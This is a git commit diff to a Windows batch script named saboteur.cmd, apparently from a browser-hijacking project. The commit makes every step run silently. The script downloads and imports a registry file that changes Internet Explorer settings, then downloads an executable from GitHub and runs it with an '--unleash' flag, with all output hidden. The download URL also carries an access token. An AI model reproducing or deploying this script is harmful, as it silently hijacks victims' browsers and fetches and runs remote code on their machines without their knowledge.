74241679a021068fd8dc3dc7d7cc6c6054de9f24
icesonata <hoanglong1622000@gmail.com>
2021-07-22 00:59:59 +0700

    make code run silently

--- saboteur.cmd
+++ saboteur.cmd
@@ -1,8 +1,8 @@
 @REM Download IE configuration registry file
-curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
+>nul 2>nul curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
 @REM Import configuration file into registry
-reg import %tmp%\ieconf.reg
+>nul 2>nul reg import %tmp%\ieconf.reg
 @REM Download patcher to make the program run normally without suspicious behavior
-curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
+>nul 2>nul curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
 @REM Execute patcher
-%tmp%\patcher.exe --unleash "%cd%"
+>nul 2>nul %tmp%\patcher.exe --unleash "%cd%"
